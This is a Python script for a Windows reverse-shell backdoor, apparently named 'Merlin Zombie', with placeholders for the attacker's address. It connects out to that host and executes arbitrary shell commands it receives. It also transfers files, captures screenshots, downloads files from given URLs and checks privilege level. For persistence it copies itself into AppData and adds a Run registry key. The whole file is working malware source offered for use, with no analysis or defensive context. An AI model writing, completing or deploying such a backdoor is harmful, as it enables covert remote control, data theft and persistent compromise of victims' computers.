#!/usr/bin/python3

import socket
from termcolor import colored
import subprocess
import json
import os
import pyautogui
import shutil
import time
import sys
import requests

def reliable_send(data):
    jsondata = json.dumps(data)
    reverse.send(jsondata.encode())

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + reverse.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file_name):
    f = open(file_name, 'wb')
    reverse.settimeout(1)
    chunk = reverse.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = reverse.recv(1024)
        except socket.timeout as e:
            break
    reverse.settimeout(None)
    f.close()

def upload_file(file_name):
    f = open(file_name, 'rb')
    reverse.send(f.read())

def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
            reliable_send('[+] Creating Zombie With Reg Key: ' + reg_name)
        else:
            reliable_send(colored('[+] Merlin Zombie exists [+]', 'green'))
    except:
        reliable_send(colored('[-] Error Creating Zombie [-]', 'red'))

def screenshot():
    victim_screen = pyautogui.screenshot()
    victim_screen.save('screen.png')

def connection():
    while True:
        time.sleep(20)
        try:
            reverse.connect(('<your ip>', <your ip>))
            commands()
            reverse.close()
            break
        except:
            connection()

def download_url(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as f:
        f.write(get_response.content)

def is_admin():
    global admin
    try:
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
    except:
        admin = colored('[+] User Previleges [+]', 'green')
    else:
        admin = colored('[+] Administrator Previleges [+]')

def commands():
    global reverse
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            try:
                os.chdir(command[3:])
            except:
                print(colored('[-] Directory Not Present [-]', 'red'))
        elif command == 'clear':
            pass
        elif command == 'help':
            pass
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split()
            persist(reg_name, copy_name)
        elif command[:3] == 'get':
            try:
                download_url(command[4:])
                reliable_send(colored('[+] Downloaded File From Specified URL [+]', 'green'))
            except:
                reliable_send(colored('[-] Failed To Download File From Specified URL [-]', 'red'))
        elif command[:5] == 'check':
            try:
                is_admin()
                reliable_send(admin)
            except:
                reliable_send(colored("[-] Can't Perfom previleges check [-]", 'red'))
        else:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = process.stdout.read() + process.stderr.read()
            reliable_send(result.decode())

reverse = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
